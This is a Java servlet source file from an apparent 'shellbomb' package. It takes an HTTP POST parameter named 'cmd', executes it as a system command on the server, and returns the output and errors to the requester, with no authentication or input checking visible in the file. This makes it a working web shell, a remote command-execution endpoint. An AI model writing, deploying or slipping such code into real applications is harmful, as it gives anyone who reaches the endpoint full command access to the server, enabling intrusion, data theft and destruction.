package com.shellbomb.servlet;

import com.shellbomb.CommandLine;
import com.shellbomb.ProcessOutput;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class CommandLineServlet extends ShellbombServlet {

    public void doPost(HttpServletRequest request, HttpServletResponse response)
            throws IOException, ServletException {
        setLocalContext(request);
        String cmd = request.getParameter("cmd");
        if (cmd != null){
            ProcessOutput output = CommandLine.instance().executeCommand(cmd);
            if (output != null){
                StringBuffer out = new StringBuffer();
                StringBuffer errs = new StringBuffer();
                for (String line: output.getOutput()){
                    out.append(line).append("\n");
                }
                for (String err: output.getErrors()){
                    errs.append(err).append("\n");
                }
                if (out.length() > 0){
                    request.setAttribute("commandOutput", out);
                }
                if (errs.length() > 0){
                    request.setAttribute("commandError", errs);
                }
            }
        }

        index(request, response);
    }

}
